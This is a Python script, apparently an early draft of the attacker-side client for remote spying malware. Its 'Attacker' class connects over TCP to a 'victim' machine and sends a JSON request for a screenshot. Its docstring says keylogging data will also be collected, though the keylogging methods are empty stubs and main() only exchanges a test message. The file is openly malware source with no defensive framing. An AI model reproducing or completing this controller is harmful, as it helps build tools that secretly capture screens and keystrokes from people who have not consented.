import socket
import sys
import random
import json

SHELL_ARGUMENTS = sys.argv

# the victim ip and port are shell arguments (but they have default values)
TARGET_IP = '127.0.0.1' if len(SHELL_ARGUMENTS) < 2 else SHELL_ARGUMENTS[1]
TARGET_PORT = 5000 if len(SHELL_ARGUMENTS) < 3 else SHELL_ARGUMENTS[2]


class Attacker:

    """ A class for representing the attacker, who is the client.
    The attacker can request screenshots and key-logging information from the victim's computer, and
    the victim's server will serve the requests - therefore it is the server.
    Currently, the attacker is limited and can only communicate with a single target.
    """

    def __init__(self, target_ip=TARGET_IP, target_port=TARGET_PORT):
        self._target_ip = target_ip
        self._target_port = target_port
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        self._socket.connect((self._target_ip, self._target_port))
    
    def send(self, content):
        if isinstance(content, str):
            content = content.encode('utf-8')
        self._socket.send(content)

    def receive(self):
        content = self._socket.recv(1024)
        print(content.decode('utf-8'))

    def request_screenshot(self):
        request = json.dumps({
            'type': 'request',
            'resource': 'screenshot'
        })
        self.send(request)


    def start_keylogging(self):
        pass

    def stop_keylogging(self):
        pass

    @property
    def target_ip(self):
        return self._target_ip

    @property
    def target_port(self):
        return self._target_port

    def close(self):
        self._socket.close()


def main():
    attacker = Attacker()
    attacker.connect()
    attacker.send("hello world")
    attacker.receive()
    attacker.close()


if __name__ == '__main__':
    main()
